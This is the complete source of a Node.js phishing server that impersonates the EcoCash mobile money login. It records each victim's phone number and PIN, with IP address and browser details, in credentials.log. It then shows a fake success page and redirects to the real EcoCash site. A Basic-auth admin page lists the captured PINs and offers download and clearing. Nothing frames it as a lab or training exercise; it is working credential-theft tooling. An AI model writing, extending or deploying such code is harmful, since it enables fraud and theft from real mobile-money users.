const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const crypto = require('crypto');

const PORT = process.env.PORT || 8000;

// Simple authentication for admin page (you should change this!)
const ADMIN_USERNAME = 'wicky';
const ADMIN_PASSWORD = 'wicky@admin'; // CHANGE THIS to something secure!

// Function to verify basic auth
function verifyAuth(req) {
    const authHeader = req.headers.authorization || '';
    const encoded = authHeader.split(' ')[1] || '';
    const decoded = Buffer.from(encoded, 'base64').toString();
    const [username, password] = decoded.split(':');
    return username === ADMIN_USERNAME && password === ADMIN_PASSWORD;
}

// Create server
http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;

    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);

    // Serve static files (images, CSS, etc.)
    if (req.method === 'GET' && pathname.startsWith('/static/')) {
        const filePath = path.join(__dirname, pathname);
        const extname = path.extname(filePath).toLowerCase();
        
        const mimeTypes = {
            '.html': 'text/html',
            '.js': 'text/javascript',
            '.css': 'text/css',
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.gif': 'image/gif',
            '.ico': 'image/x-icon',
            '.svg': 'image/svg+xml'
        };

        const contentType = mimeTypes[extname] || 'application/octet-stream';

        fs.readFile(filePath, (err, data) => {
            if (err) {
                console.error('File not found:', filePath);
                res.writeHead(404);
                res.end('File not found');
                return;
            }
            
            res.writeHead(200, { 'Content-Type': contentType });
            res.end(data);
        });
        return;
    }

    // Serve the HTML file for GET requests to root
    if (req.method === 'GET' && pathname === '/') {
        console.log('Serving HTML page');
        fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
            if (err) {
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Error loading index.html');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        });
        return;
    }

    // Handle login POST requests
    if (req.method === 'POST' && pathname === '/login') {
        console.log('Processing login request');
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', () => {
            console.log('Raw form data:', body);
            
            try {
                const data = new URLSearchParams(body);
                const credentials = {
                    ecocashNumber: data.get('ecocashNumber'),
                    ecocashPin: data.get('ecocashPin'),
                    timestamp: new Date().toISOString(),
                    userAgent: req.headers['user-agent'],
                    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
                };
                
                console.log('Captured credentials:', credentials);
                
                // Save to file with JSON formatting
                const logEntry = JSON.stringify(credentials, null, 2) + ',\n';
                fs.appendFile('credentials.log', logEntry, (err) => {
                    if (err) {
                        console.error('Error writing to file:', err);
                    } else {
                        console.log('✅ Credentials saved to credentials.log');
                    }
                });
                
                // Send success HTML page with redirect
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>Login Successful</title>
                        <style>
                            body { 
                                font-family: Arial, sans-serif; 
                                display: flex; 
                                justify-content: center; 
                                align-items: center; 
                                height: 100vh; 
                                background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
                                margin: 0;
                            }
                            .success-container {
                                background: white;
                                padding: 40px;
                                border-radius: 10px;
                                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                                text-align: center;
                            }
                            .success-icon {
                                font-size: 60px;
                                color: #4CAF50;
                                margin-bottom: 20px;
                            }
                            h2 { color: #333; margin-bottom: 15px; }
                            p { color: #666; }
                        </style>
                    </head>
                    <body>
                        <div class="success-container">
                            <div class="success-icon">✓</div>
                            <h2>Login Successful!</h2>
                            <p>Redirecting to your account...</p>
                            <script>
                                setTimeout(function() {
                                    window.location.href = 'https://ecocash.co.zw/';
                                }, 2000);
                            </script>
                        </div>
                    </body>
                    </html>
                `);
                
            } catch (error) {
                console.error('Error processing request:', error);
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Server error');
            }
        });
        return;
    }

    // ADMIN PAGE - View captured credentials
    if (req.method === 'GET' && pathname === '/admin') {
        // Check authentication
        if (!verifyAuth(req)) {
            res.writeHead(401, {
                'WWW-Authenticate': 'Basic realm="Admin Access"',
                'Content-Type': 'text/html'
            });
            res.end('<h1>Authentication Required</h1>');
            return;
        }

        // Read and display credentials
        fs.readFile('credentials.log', 'utf8', (err, data) => {
            if (err && err.code === 'ENOENT') {
                // File doesn't exist yet
                data = 'No credentials captured yet.';
            } else if (err) {
                data = `Error reading file: ${err.message}`;
            }

            // Format the data nicely
            let formattedData = data;
            try {
                // Try to parse as JSON array if file has content
                if (data.trim()) {
                    // Remove trailing comma and wrap in array brackets
                    const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
                    const parsed = JSON.parse(jsonArray);
                    formattedData = JSON.stringify(parsed, null, 2);
                }
            } catch (e) {
                // If not valid JSON, display as-is
                formattedData = data;
            }

            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Admin - Captured Credentials</title>
                    <style>
                        * {
                            margin: 0;
                            padding: 0;
                            box-sizing: border-box;
                            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                        }
                        body {
                            background: #f5f5f5;
                            padding: 20px;
                            color: #333;
                        }
                        .container {
                            max-width: 1200px;
                            margin: 0 auto;
                            background: white;
                            border-radius: 8px;
                            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                            padding: 30px;
                        }
                        header {
                            text-align: center;
                            margin-bottom: 30px;
                            padding-bottom: 20px;
                            border-bottom: 1px solid #eee;
                        }
                        h1 {
                            color: #d32f2f;
                            margin-bottom: 10px;
                        }
                        .stats {
                            display: flex;
                            gap: 20px;
                            margin-bottom: 20px;
                            flex-wrap: wrap;
                        }
                        .stat-box {
                            background: #f8f9fa;
                            padding: 15px;
                            border-radius: 6px;
                            border-left: 4px solid #1a73e8;
                            flex: 1;
                            min-width: 200px;
                        }
                        .stat-box h3 {
                            margin-bottom: 5px;
                            color: #555;
                        }
                        .stat-box p {
                            font-size: 24px;
                            font-weight: bold;
                            color: #1a73e8;
                        }
                        .actions {
                            margin-bottom: 20px;
                            display: flex;
                            gap: 10px;
                        }
                        .btn {
                            padding: 10px 20px;
                            background: #1a73e8;
                            color: white;
                            border: none;
                            border-radius: 4px;
                            cursor: pointer;
                            text-decoration: none;
                            display: inline-block;
                        }
                        .btn-danger {
                            background: #d32f2f;
                        }
                        .btn:hover {
                            opacity: 0.9;
                        }
                        .data-container {
                            background: #f8f9fa;
                            border-radius: 6px;
                            padding: 20px;
                            margin-top: 20px;
                            overflow-x: auto;
                        }
                        pre {
                            white-space: pre-wrap;
                            word-wrap: break-word;
                            font-family: 'Courier New', monospace;
                            font-size: 14px;
                            line-height: 1.5;
                        }
                        .credential-item {
                            background: white;
                            border: 1px solid #ddd;
                            border-radius: 4px;
                            padding: 15px;
                            margin-bottom: 10px;
                        }
                        .timestamp {
                            color: #666;
                            font-size: 12px;
                            margin-bottom: 5px;
                        }
                        .phone-number {
                            color: #1a73e8;
                            font-weight: bold;
                            font-size: 18px;
                            margin-bottom: 5px;
                        }
                        .pin {
                            color: #d32f2f;
                            font-family: monospace;
                            font-size: 16px;
                        }
                        .ip-info {
                            color: #666;
                            font-size: 12px;
                            margin-top: 5px;
                        }
                        footer {
                            margin-top: 30px;
                            text-align: center;
                            color: #666;
                            font-size: 12px;
                            padding-top: 20px;
                            border-top: 1px solid #eee;
                        }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <header>
                            <h1>📋 Captured Credentials</h1>
                            <p>Access restricted to administrators only</p>
                        </header>
                        
                        <div class="actions">
                            <a href="/admin" class="btn">Refresh</a>
                            <a href="/admin?download=true" class="btn">Download Log</a>
                            <button onclick="if(confirm('Delete all logs?')) location.href='/admin?delete=true'" class="btn btn-danger">Clear All</button>
                        </div>
                        
                        <div class="data-container">
                            <h3>Latest Entries:</h3>
                            ${formatCredentials(data)}
                        </div>
                        
                        <footer>
                            Server: ${req.headers.host} | Total entries: ${countEntries(data)} | Last updated: ${new Date().toLocaleString()}
                        </footer>
                    </div>
                    
                    <script>
                        // Auto-refresh every 30 seconds
                        setTimeout(() => location.reload(), 30000);
                        
                        // Copy to clipboard function
                        function copyToClipboard(text) {
                            navigator.clipboard.writeText(text).then(() => {
                                alert('Copied to clipboard!');
                            });
                        }
                    </script>
                </body>
                </html>
            `);
        });
        return;
    }

    // Download log file
    if (req.method === 'GET' && pathname === '/admin' && parsedUrl.query.download === 'true') {
        if (!verifyAuth(req)) {
            res.writeHead(401, {
                'WWW-Authenticate': 'Basic realm="Admin Access"',
                'Content-Type': 'text/html'
            });
            res.end('<h1>Authentication Required</h1>');
            return;
        }

        res.writeHead(200, {
            'Content-Type': 'application/json',
            'Content-Disposition': 'attachment; filename="credentials_log.json"'
        });
        
        fs.createReadStream('credentials.log').pipe(res);
        return;
    }

    // Delete log file
    if (req.method === 'GET' && pathname === '/admin' && parsedUrl.query.delete === 'true') {
        if (!verifyAuth(req)) {
            res.writeHead(401, {
                'WWW-Authenticate': 'Basic realm="Admin Access"',
                'Content-Type': 'text/html'
            });
            res.end('<h1>Authentication Required</h1>');
            return;
        }

        fs.writeFile('credentials.log', '', (err) => {
            res.writeHead(302, { 'Location': '/admin' });
            res.end();
        });
        return;
    }

    // Handle GET requests to /login - show a message
    if (req.method === 'GET' && pathname === '/login') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
            <!DOCTYPE html>
            <html>
            <head><title>EcoCash Login</title></head>
            <body>
                <h1>EcoCash Login</h1>
                <p>Please use the <a href="/">login form</a> to access your account.</p>
            </body>
            </html>
        `);
        return;
    }

    // Handle other routes
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end(`
        <!DOCTYPE html>
        <html>
        <head><title>404 Not Found</title></head>
        <body>
            <h1>404 - Page Not Found</h1>
            <p>Return to <a href="/">EcoCash Login</a></p>
        </body>
        </html>
    `);
}).listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📝 Access the login page at: http://localhost:${PORT}`);
    console.log(`🔐 Access admin panel at: http://localhost:${PORT}/admin`);
    console.log(`📁 Credentials will be saved to: credentials.log`);
    console.log(`⚠️  ADMIN CREDENTIALS: ${ADMIN_USERNAME}:${ADMIN_PASSWORD}`);
});

// Helper functions for formatting
function formatCredentials(data) {
    if (!data.trim()) return '<p>No credentials captured yet.</p>';
    
    try {
        // Remove trailing comma and wrap in array
        const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
        const parsed = JSON.parse(jsonArray);
        
        let html = '';
        parsed.reverse().forEach((cred, index) => {
            html += `
                <div class="credential-item">
                    <div class="timestamp">${new Date(cred.timestamp).toLocaleString()} (#${parsed.length - index})</div>
                    <div class="phone-number">📱 ${cred.ecocashNumber}</div>
                    <div class="pin">🔒 PIN: ${cred.ecocashPin}</div>
                    <div class="ip-info">🌐 IP: ${cred.ip || 'Unknown'} | ${cred.userAgent?.substring(0, 50)}...</div>
                </div>
            `;
        });
        return html;
    } catch (e) {
        return `<pre>${data}</pre>`;
    }
}

function countEntries(data) {
    if (!data.trim()) return 0;
    try {
        const jsonArray = '[' + data.trim().replace(/,\s*$/, '') + ']';
        const parsed = JSON.parse(jsonArray);
        return parsed.length;
    } catch (e) {
        return data.split('\n').filter(line => line.trim()).length;
    }
}